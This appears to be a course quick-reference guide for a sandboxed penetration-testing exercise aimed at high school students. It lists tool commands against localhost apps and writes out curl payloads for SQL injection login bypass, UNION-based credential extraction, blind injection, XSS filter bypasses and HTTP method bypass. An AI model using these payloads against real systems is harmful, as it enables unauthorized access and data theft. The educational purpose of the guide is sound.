# Penetration Testing - Quick Reference

## üöÄ Essential Commands

### Automated Penetration Testing

```bash
# Comprehensive automated penetration testing
python src/analyzer/penetration_analyzer.py localhost:5000    # Test PWA application
python src/analyzer/penetration_analyzer.py localhost:9090    # Test Flask application  
python src/analyzer/penetration_analyzer.py localhost:3000    # Test Node.js application
python src/analyzer/penetration_analyzer.py localhost:8000    # Test uploads application

# Professional-grade automated assessment with dictionary attacks
# Detects: SQL injection, XSS, weak authentication, debug exposure, misconfigurations
# Features: 50-credential dictionary testing, rate limiting, comprehensive reporting
```

### Manual Penetration Testing Methodology

```bash
# Phase 1: Reconnaissance  
python src/analyzer/network_cli.py --scan-services localhost --educational
python src/analyzer/dast_cli.py http://localhost:5000 --quick --educational

# Phase 2: Vulnerability Assessment
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --educational
python src/analyzer/dast_cli.py http://localhost:5000 --deep-scan --educational

# Phase 3A: Automated Testing (NEW)
python src/analyzer/penetration_analyzer.py localhost:5000
python src/analyzer/penetration_analyzer.py localhost:9090

# Phase 3B: Manual Exploitation (controlled environment only)
curl -X POST "http://localhost:5000/login" -d "username=admin' OR '1'='1&password=test"
curl "http://localhost:5000/search?q=<script>alert('XSS')</script>"

# Phase 4: Post-Exploitation Analysis
python samples/backdoor-apps/backdoor_app.py &
python src/analyzer/network_cli.py --monitor-connections --duration 60 --educational
```

### ü§ñ vs üë§ Automated vs Manual Testing

**Use Automated Tools When:**
- Initial vulnerability discovery is needed
- Large-scale assessments with time constraints
- Baseline security posture assessment required  
- Consistent repeatable testing is important
- Dictionary attacks and common vulnerabilities

**Use Manual Testing When:**
- Business logic flaws need investigation
- Custom applications require specific testing
- Advanced attack techniques are necessary
- Detailed exploitation validation is required
- Complex attack chain development needed

**Professional Approach:**
```bash
# 1. Start with automated baseline
python src/analyzer/penetration_analyzer.py [target]

# 2. Analyze automated results for manual targets
grep -i "critical\|high" reports/automated_pentest.txt

# 3. Perform targeted manual testing
curl -X POST [target] -d [custom_payload]

# 4. Combine results for comprehensive assessment
```

### Integrated Analysis Commands

```bash
# Full automated penetration testing suite
python src/analyzer/penetration_analyzer.py localhost:5000   # Automated comprehensive testing
python src/analyzer/penetration_analyzer.py localhost:9090   # Automated comprehensive testing

# Traditional security assessment (SAST/DAST/Network)
python src/analyzer/analyze_cli.py samples/ --educational --output reports/pentest_sast.json
python src/analyzer/dast_cli.py --demo-apps --educational --output reports/pentest_dast.json
python src/analyzer/network_cli.py --monitor-connections --educational --output reports/pentest_network.json

# Combined approach workflow
# 1. Automated baseline
python src/analyzer/penetration_analyzer.py localhost:5000 > reports/automated_baseline.txt

# 2. Manual validation and extension  
curl -X POST "http://localhost:5000/login" -d "username=admin' OR 1=1--&password=any"

# 3. Generate comprehensive report package
ls -la reports/pentest_* reports/automated_*
```

### Professional Automated Penetration Testing

```bash
# Comprehensive automated vulnerability assessment
python src/analyzer/penetration_analyzer.py localhost:5000

# Expected automated capabilities:
# ‚úÖ Reconnaissance: Service discovery, technology identification
# ‚úÖ Vulnerability Detection: SQL injection, XSS, weak auth, debug exposure
# ‚úÖ Dictionary Attacks: 50 username/password combinations with rate limiting
# ‚úÖ Security Analysis: Missing headers, configuration issues
# ‚úÖ Professional Reporting: Risk-based findings with business impact

# Example Output:
# Penetration Test Report for: localhost:5000
# Total findings: 24
# Risk level: HIGH
# Critical: 3, High: 20, Medium: 1
# [CRITICAL] SQL Injection in Parameter 'username'
# [HIGH] Weak Authentication: admin:password  
# [MEDIUM] Missing CSRF Protection
```

## üîç Reconnaissance Techniques

### Network Discovery

```bash
# Service discovery
python src/analyzer/network_cli.py --scan-services localhost --educational
python src/analyzer/network_cli.py --scan-services localhost --ports 21,22,23,25,53,80,443,993,995,3389,5900

# Connection monitoring
python src/analyzer/network_cli.py --monitor-connections --educational --duration 300

# DNS analysis
python src/analyzer/network_cli.py --dns-analysis --educational --duration 60
```

### Web Application Enumeration

```bash
# Basic enumeration
python src/analyzer/dast_cli.py http://localhost:5000 --quick --educational
python src/analyzer/dast_cli.py http://localhost:8080 --quick --educational

# Deep enumeration
python src/analyzer/dast_cli.py http://localhost:5000 --deep-scan --educational
python src/analyzer/dast_cli.py --demo-apps --educational

# Manual enumeration
curl -I http://localhost:5000                    # Headers
curl http://localhost:5000/robots.txt            # Robots file
curl http://localhost:5000/sitemap.xml           # Sitemap
```

### Technology Stack Analysis

```bash
# Static code analysis for tech stack
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --educational --verbose
python src/analyzer/analyze_cli.py samples/unsecure-pwa --educational --verbose

# Dependency analysis
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --check-dependencies
python src/analyzer/analyze_cli.py samples/unsecure-pwa --check-dependencies
```

## üéØ Vulnerability Assessment

### SAST Integration

```bash
# Comprehensive static analysis
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --educational
python src/analyzer/analyze_cli.py samples/unsecure-pwa --educational
python src/analyzer/analyze_cli.py samples/suspicious-scripts --educational

# Focus on exploitable vulnerabilities
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --severity high,critical
```

### DAST Integration

```bash
# Runtime vulnerability testing
python src/analyzer/dast_cli.py http://localhost:5000 --test-xss --test-sqli --educational
python src/analyzer/dast_cli.py http://localhost:8080 --test-xss --test-sqli --educational

# Security header analysis
python src/analyzer/dast_cli.py http://localhost:5000 --check-headers --educational
```

### Network Analysis Integration

```bash
# Baseline traffic analysis
python samples/network-scenarios/basic_network_activity.py 120 &
python src/analyzer/network_cli.py --capture-traffic --duration 130 --educational

# Suspicious pattern detection
python samples/network-scenarios/suspicious_traffic_generator.py 120 &
python src/analyzer/network_cli.py --monitor-connections --duration 130 --educational
```

### Risk Prioritization Matrix

```bash
# Automated Tool Baseline Assessment
python src/analyzer/penetration_analyzer.py localhost:5000

# High Priority Targets (Critical + Exploitable) - Automated Detection
# 1. SQL Injection in login forms ‚úÖ Detected by automated tool
# 2. XSS in user input fields ‚úÖ Detected by automated tool  
# 3. Debug mode enabled ‚úÖ Detected by automated tool
# 4. Weak authentication mechanisms ‚úÖ Detected with dictionary attacks
# 5. Unvalidated redirects ‚úÖ Detected by automated tool

# Medium Priority Targets - May Require Manual Testing
# 6. Missing security headers ‚úÖ Detected by automated tool
# 7. Information disclosure ‚úÖ Detected by automated tool
# 8. Session management issues ‚ùì Requires manual validation
# 9. Input validation problems ‚ùì Requires manual validation
# 10. Configuration weaknesses ‚úÖ Detected by automated tool

# Advanced Targets - Manual Testing Required
# 11. Business logic flaws ‚ùå Manual testing only
# 12. Complex attack chains ‚ùå Manual testing only
# 13. Custom application vulnerabilities ‚ùå Manual testing only
# 14. Social engineering vectors ‚ùå Manual testing only
```

### Professional Workflow Integration

```bash
# Step 1: Automated Baseline (30 minutes)
python src/analyzer/penetration_analyzer.py localhost:5000 > reports/automated_assessment.txt
python src/analyzer/penetration_analyzer.py localhost:9090 >> reports/automated_assessment.txt

# Step 2: Analysis and Prioritization (15 minutes)
grep -E "CRITICAL|HIGH" reports/automated_assessment.txt > reports/priority_targets.txt
wc -l reports/priority_targets.txt  # Count high-priority issues

# Step 3: Manual Validation and Extension (60-90 minutes)
# Focus manual testing on automated findings and gaps
curl -X POST "http://localhost:5000/login" -d "username=admin' OR 1=1--&password=test"

# Step 4: Combined Reporting (30 minutes)
echo "Automated Findings:" > reports/combined_assessment.txt
cat reports/automated_assessment.txt >> reports/combined_assessment.txt
echo "Manual Validation:" >> reports/combined_assessment.txt
# Add manual findings...
```

## ‚öîÔ∏è Controlled Exploitation

### Automated Vulnerability Discovery

```bash
# Use automated tool to identify exploitable vulnerabilities
python src/analyzer/penetration_analyzer.py localhost:5000

# Review automated findings for exploitation targets
grep -A 5 -B 5 "CRITICAL\|HIGH" reports/automated_pentest.txt

# Automated tool capabilities:
# ‚úÖ SQL injection detection and testing
# ‚úÖ XSS vulnerability identification  
# ‚úÖ Weak authentication discovery (dictionary attacks)
# ‚úÖ Configuration issue identification
# ‚úÖ Security header analysis
```

### Manual SQL Injection Testing

```bash
# Basic authentication bypass (validate automated findings)
curl -X POST "http://localhost:5000/login" \
  -d "username=admin' OR '1'='1&password=anything" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Union-based injection (extend automated discoveries)
curl -X POST "http://localhost:5000/search" \
  -d "query=' UNION SELECT username,password FROM users--" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Error-based injection (manual technique)
curl -X POST "http://localhost:5000/login" \
  -d "username=admin' AND (SELECT COUNT(*) FROM users)>0--&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Time-based blind injection (advanced manual technique)
curl -X POST "http://localhost:5000/login" \
  -d "username=admin' AND (SELECT sleep(5))--&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

### Manual Cross-Site Scripting (XSS)

```bash
# Reflected XSS (validate automated findings)
curl "http://localhost:5000/search?q=<script>alert('Reflected XSS')</script>"
curl "http://localhost:5000/user?name=<img src=x onerror=alert('XSS')>"

# Stored XSS (extend automated testing)
curl -X POST "http://localhost:5000/comment" \
  -d "comment=<script>alert('Stored XSS')</script>" \
  -H "Content-Type: application/x-www-form-urlencoded"

# DOM-based XSS (often missed by automated tools)
curl "http://localhost:5000/profile#<img src=x onerror=alert('DOM XSS')>"

# Filter bypass techniques (advanced manual testing)
curl "http://localhost:5000/search?q=<svg onload=alert('Bypass')>"
curl "http://localhost:5000/search?q=<img src=x onerror=alert('Filter_Bypass')>"
```

### Authentication and Session Testing

```bash
# Automated dictionary attack validation
# (automated tool tests 50 common username/password combinations)
python src/analyzer/penetration_analyzer.py localhost:5000 | grep -i "weak authentication"

# Manual authentication bypass techniques  
curl -X POST "http://localhost:8080/login" \
  -d "username=admin&password=admin" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Session manipulation (manual technique)
curl -X GET "http://localhost:5000/admin" \
  -H "Cookie: session=modified_session_value"

# Parameter pollution (advanced manual technique)
curl -X POST "http://localhost:5000/login" \
  -d "username=user&username=admin&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded"

# HTTP method bypass (manual technique)
curl -X PUT "http://localhost:5000/admin/users"
curl -X DELETE "http://localhost:5000/admin/users/1"
```

## üîç Post-Exploitation Analysis

### Persistence Simulation

```bash
# Backdoor communication patterns
python samples/backdoor-apps/backdoor_app.py &
python src/analyzer/network_cli.py --monitor-connections --duration 120 --educational

# Persistence mechanism analysis
python samples/network-scenarios/backdoor_simulation.py 90 &
python src/analyzer/network_cli.py --capture-traffic --duration 100 --educational
```

### Data Exfiltration Patterns

```bash
# Monitor exfiltration traffic
python samples/network-scenarios/backdoor_simulation.py 120 &
python src/analyzer/network_cli.py --dns-analysis --duration 130 --educational

# DNS tunneling detection
python samples/network-scenarios/dns_threat_scenarios.py 60 &
python src/analyzer/network_cli.py --dns-analysis --duration 70 --educational
```

### Lateral Movement Simulation

```bash
# Internal network discovery
python src/analyzer/network_cli.py --scan-services 127.0.0.1 --educational

# Suspicious network patterns
python samples/network-scenarios/suspicious_traffic_generator.py 60 &
python src/analyzer/network_cli.py --monitor-connections --duration 70 --educational
```

## üìä Professional Reporting

### Automated Report Generation

```bash
# Generate automated penetration testing reports
python src/analyzer/penetration_analyzer.py localhost:5000 > reports/automated_pentest_pwa.txt
python src/analyzer/penetration_analyzer.py localhost:9090 > reports/automated_pentest_flask.txt

# Traditional analysis reports  
python src/analyzer/analyze_cli.py samples/ --educational --output reports/pentest_final_sast.json
python src/analyzer/dast_cli.py --demo-apps --educational --output reports/pentest_final_dast.json
python src/analyzer/network_cli.py --demo-network --educational --output reports/pentest_final_network.json

# Review all generated reports
ls -la reports/pentest_* reports/automated_*
head -20 reports/automated_*.txt
tail -20 reports/pentest_*.json
```

### Comprehensive Assessment Report Structure

```markdown
# Professional Penetration Testing Report

## Executive Summary
- **Automated Baseline**: X vulnerabilities discovered in Y minutes using professional tools
- **Manual Validation**: Z additional vulnerabilities confirmed through expert analysis
- **Combined Risk Assessment**: Overall security posture and business impact
- **Efficiency Analysis**: Automated vs manual testing effectiveness

## Technical Assessment Methodology

### Automated Testing Phase (Phase 3A)
- **Tool Used**: Professional penetration testing analyzer
- **Scope**: Comprehensive vulnerability discovery and dictionary attacks
- **Duration**: 30-45 minutes per target application  
- **Coverage**: SQL injection, XSS, weak authentication, configuration issues

### Manual Testing Phase (Phase 3B)  
- **Methodology**: Custom payload development and business logic testing
- **Scope**: Validation and extension of automated findings
- **Duration**: 60-90 minutes per target application
- **Coverage**: Advanced exploitation, custom attack chains, logic flaws

## Combined Findings Analysis
- **Automated Discovery**: Rapid baseline vulnerability identification
- **Manual Validation**: Confirmation and detailed exploitation development
- **Unique Manual Findings**: Issues missed by automated tools
- **Efficiency Assessment**: Time vs coverage analysis
```

### Automated vs Manual Comparison Report

```bash
# Generate comparison analysis
echo "=== AUTOMATED PENETRATION TESTING RESULTS ===" > reports/comparison_analysis.txt
python src/analyzer/penetration_analyzer.py localhost:5000 >> reports/comparison_analysis.txt

echo "=== MANUAL TESTING VALIDATION ===" >> reports/comparison_analysis.txt
echo "Manual SQL injection validation:" >> reports/comparison_analysis.txt
curl -X POST "http://localhost:5000/login" -d "username=admin' OR 1=1--&password=test" >> reports/comparison_analysis.txt

echo "=== COVERAGE ANALYSIS ===" >> reports/comparison_analysis.txt
echo "Automated findings: [Count from automated tool]" >> reports/comparison_analysis.txt  
echo "Manual additional findings: [Count from manual testing]" >> reports/comparison_analysis.txt
echo "Combined unique vulnerabilities: [Total count]" >> reports/comparison_analysis.txt
```

### Risk Assessment Framework

```bash
# CVSS Base Score Calculation
# Exploitability Metrics:
# - Attack Vector (Network/Adjacent/Local/Physical)
# - Attack Complexity (Low/High)
# - Privileges Required (None/Low/High)
# - User Interaction (None/Required)

# Impact Metrics:
# - Confidentiality (None/Low/High)
# - Integrity (None/Low/High)
# - Availability (None/Low/High)

# Risk Priority = (Exploitability Score) √ó (Impact Score)
```

### Executive Summary Template

```markdown
# Penetration Testing Executive Summary

## Assessment Overview

- **Target**: Secure Architecture Sandbox Testing Environment
- **Duration**: [Testing Period]
- **Methodology**: OWASP Testing Guide + NIST Framework

## Risk Summary

- **Critical**: X vulnerabilities requiring immediate attention
- **High**: X vulnerabilities requiring prompt remediation
- **Medium**: X vulnerabilities for planned remediation
- **Low**: X informational findings

## Business Impact

- **Immediate Risk**: [Description]
- **Potential Data Exposure**: [Types of data at risk]
- **Compliance Impact**: [Regulatory considerations]

## Recommendations

1. **Immediate Actions** (0-30 days)
2. **Short-term Improvements** (1-3 months)
3. **Long-term Strategy** (6-12 months)
```

## üõ°Ô∏è Ethical Guidelines Quick Reference

### Legal Boundaries

```bash
# ‚úÖ AUTHORIZED ACTIVITIES (Sandbox Only)
# - Testing provided vulnerable applications
# - Using educational tools on localhost
# - Documenting findings for learning
# - Practicing on owned systems

# ‚ùå UNAUTHORIZED ACTIVITIES (Never)
# - Testing systems you don't own
# - Accessing production systems
# - Causing damage or disruption
# - Sharing or selling vulnerabilities
```

### Professional Standards

- **Permission**: Always obtain written authorization
- **Scope**: Stay within defined testing boundaries
- **Documentation**: Record all testing activities
- **Reporting**: Provide actionable findings
- **Confidentiality**: Protect client information

### Incident Response

```bash
# If you accidentally access unauthorized data:
# 1. Stop the activity immediately
# 2. Document what happened
# 3. Report to instructor/supervisor
# 4. Do not access or copy the data
# 5. Follow organizational incident procedures
```

## üîß Troubleshooting

### Common Issues and Solutions

```bash
# Services not responding
# Solution: Restart applications
cd samples/vulnerable-flask-app && python app.py &
cd samples/unsecure-pwa && python main.py &

# Permission denied errors
# Solution: Use educational mode
python src/analyzer/network_cli.py --demo-network --educational

# Network tools not available
# Solution: Use built-in alternatives
python src/analyzer/network_cli.py --scan-services localhost --educational
```

### Performance Optimization

```bash
# Reduce output verbosity
python src/analyzer/analyze_cli.py samples/vulnerable-flask-app --quiet

# Focus on specific vulnerability types
python src/analyzer/dast_cli.py http://localhost:5000 --test-sqli --educational

# Limit scan duration
python src/analyzer/network_cli.py --monitor-connections --duration 60 --educational
```

### Environment Validation

```bash
# Check all tools are working
python src/analyzer/analyze_cli.py --help
python src/analyzer/dast_cli.py --help
python src/analyzer/network_cli.py --help

# Verify applications are running
curl -I http://localhost:5000
curl -I http://localhost:8080

# Test network connectivity
python src/analyzer/network_cli.py --scan-services localhost --ports 5000,8080
```

## üìö Methodology Reference

### OWASP Testing Guide Phases

1. **Information Gathering**

   - Conduct search engine discovery
   - Fingerprint web application framework
   - Map application architecture

2. **Configuration Management**

   - Test network infrastructure configuration
   - Test application platform configuration
   - Test file extensions handling

3. **Authentication Testing**

   - Test credentials transported over encrypted channel
   - Test default credentials
   - Test weak lock out mechanism

4. **Authorization Testing**

   - Test directory traversal
   - Test privilege escalation
   - Test insecure direct object references

5. **Session Management**
   - Test session token strength
   - Test cookie attributes
   - Test session fixation

### NIST Cybersecurity Framework Integration

- **Identify**: Asset discovery and risk assessment
- **Protect**: Vulnerability remediation recommendations
- **Detect**: Monitoring and alerting improvements
- **Respond**: Incident response procedure updates
- **Recover**: Business continuity considerations

## üéØ Career Development

### Industry Certifications

- **CEH**: Certified Ethical Hacker (Entry Level)
- **OSCP**: Offensive Security Certified Professional (Advanced)
- **CISSP**: Certified Information Systems Security Professional (Management)
- **CISM**: Certified Information Security Manager (Leadership)

### Skill Development Path

1. **Foundation**: Complete all sandbox exercises (SAST, DAST, Network,
   Penetration Testing)
2. **Practice**: Set up home labs with deliberately vulnerable applications
3. **Learning**: Take online courses and read security research
4. **Certification**: Pursue industry-recognized certifications
5. **Experience**: Contribute to open source security projects
6. **Specialization**: Focus on specific areas (web app security, network
   security, etc.)

---

**Duration**: Reference for 4-5 hour exercise  
**Difficulty**: Advanced  
**Prerequisites**: SAST, DAST, Network Analysis, Sandbox exercises completed  
**Target Audience**: High school students with cybersecurity interest
